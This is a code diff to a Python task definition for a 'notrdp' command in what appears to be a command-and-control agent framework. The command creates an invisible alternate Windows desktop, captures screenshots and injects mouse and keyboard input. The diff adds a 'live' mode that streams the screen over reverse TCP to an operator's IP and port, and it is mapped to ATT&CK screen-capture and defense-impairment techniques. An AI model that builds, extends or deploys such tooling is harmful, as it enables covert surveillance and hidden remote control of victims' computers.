@@ -11,9 +11,9 @@ class NotRdpArguments(TaskArguments):
                 cli_name="Action",
                 display_name="Action",
                 type=ParameterType.ChooseOne,
-                choices=["start", "shot", "input", "stop"],
+                choices=["start", "shot", "input", "live", "stop"],
                 default_value="start",
-                description="start: create hidden desktop; shot: capture screen; input: inject mouse/keyboard; stop: teardown",
+                description="start: create hidden desktop; shot: capture screen; input: inject mouse/keyboard; live: reverse-connect to browser viewer; stop: teardown",
                 parameter_group_info=[
                     ParameterGroupInfo(
                         required=True,
@@ -58,7 +58,7 @@ class NotRdpArguments(TaskArguments):
                 display_name="Mouse/Key Action",
                 type=ParameterType.Number,
                 default_value=0,
-                description="0=move,1=lclick,2=rclick,3=dblclick,4=ldown,5=lup,6=rdown,7=rup,10=kpress,11=kdown,12=kup",
+                description="0=move,1=lclick,2=rclick,3=dblclick,4=ldown,5=lup,6=rdown,7=rup,8=scroll,10=kpress,11=kdown,12=kup",
                 parameter_group_info=[
                     ParameterGroupInfo(
                         required=False,
@@ -79,6 +79,66 @@ class NotRdpArguments(TaskArguments):
                         required=False,
                         group_name="Default",
                         ui_position=5,
+                    )
+                ],
+            ),
+            CommandParameter(
+                name="host",
+                cli_name="Host",
+                display_name="Viewer Host",
+                type=ParameterType.String,
+                default_value="",
+                description="Operator IP for live streaming (live action only)",
+                parameter_group_info=[
+                    ParameterGroupInfo(
+                        required=False,
+                        group_name="Default",
+                        ui_position=6,
+                    )
+                ],
+            ),
+            CommandParameter(
+                name="port",
+                cli_name="Port",
+                display_name="Viewer Port",
+                type=ParameterType.Number,
+                default_value=8124,
+                description="Operator viewer agent-port (live action only)",
+                parameter_group_info=[
+                    ParameterGroupInfo(
+                        required=False,
+                        group_name="Default",
+                        ui_position=7,
+                    )
+                ],
+            ),
+            CommandParameter(
+                name="fps",
+                cli_name="Fps",
+                display_name="Frames per second",
+                type=ParameterType.Number,
+                default_value=2,
+                description="JPEG frames per second (live action only)",
+                parameter_group_info=[
+                    ParameterGroupInfo(
+                        required=False,
+                        group_name="Default",
+                        ui_position=8,
+                    )
+                ],
+            ),
+            CommandParameter(
+                name="scale",
+                cli_name="Scale",
+                display_name="Resolution divisor",
+                type=ParameterType.Number,
+                default_value=1,
+                description="Output divisor from 1 (full resolution) through 4",
+                parameter_group_info=[
+                    ParameterGroupInfo(
+                        required=False,
+                        group_name="Default",
+                        ui_position=9,
                     )
                 ],
             ),
@@ -103,6 +163,19 @@ class NotRdpArguments(TaskArguments):
                     self.add_arg("mouse_action", int(parts[3]))
                 if len(parts) >= 5:
                     self.add_arg("key", int(parts[4]))
+            elif parts and parts[0] == "live":
+                self.add_arg("action", "live")
+                if len(parts) >= 2 and parts[1].lower() == "stop":
+                    self.add_arg("host", "stop")
+                    return
+                if len(parts) >= 2:
+                    self.add_arg("host", parts[1])
+                if len(parts) >= 3:
+                    self.add_arg("port", int(parts[2]))
+                if len(parts) >= 4:
+                    self.add_arg("fps", int(parts[3]))
+                if len(parts) >= 5:
+                    self.add_arg("scale", int(parts[4]))
             else:
                 self.add_arg("action", self.command_line.strip())
 
@@ -110,17 +183,17 @@ class NotRdpArguments(TaskArguments):
 class NotRdpCommand(CommandBase):
     cmd = "notrdp"
     needs_admin = False
-    help_cmd = "notrdp [start|shot|stop] or notrdp input <x> <y> [action] [key]"
-    description = (
-        "Invisible alternate Windows desktop with screen capture and "
-        "interactive mouse/keyboard input. start: create hidden desktop + "
-        "explorer + persistent shell; shot: capture BMP screenshot; input: "
-        "PostMessage-based mouse/keyboard injection; stop: teardown. "
-        "Note: when the agent runs as SYSTEM in session 0, captures come "
-        "back black (session 0 desktops do not render); launch the agent "
-        "inside a user session for usable screenshots."
+    help_cmd = (
+        "notrdp [start|shot|stop] | notrdp input <x> <y> [action] [key] | "
+        "notrdp live <ip> <port> [fps] [scale] | notrdp live stop"
     )
-    version = 1
+    description = (
+        "Alternate Windows desktop with tasked BMP capture and input, plus "
+        "interactive JPEG streaming to the browser viewer over reverse TCP. "
+        "The agent must run in a user session because session 0 desktops do "
+        "not render. Use the default sleep mask while live streaming."
+    )
+    version = 2
     supported_ui_features = []
     author = "@operator"
     attackmapping = ["T1113", "T1562.001"]
@@ -147,6 +220,12 @@ class NotRdpCommand(CommandBase):
             ma = taskData.args.get_arg("mouse_action") or 0
             key = taskData.args.get_arg("key") or 0
             response.DisplayParams = f"-Action input ({x},{y}) action={ma} key={key}"
+        elif action == "live":
+            host = taskData.args.get_arg("host") or ""
+            port = taskData.args.get_arg("port") or 8124
+            fps = taskData.args.get_arg("fps") or 2
+            scale = taskData.args.get_arg("scale") or 1
+            response.DisplayParams = f"-Action live {host}:{port} fps={fps} scale={scale}"
         return response
 
     async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
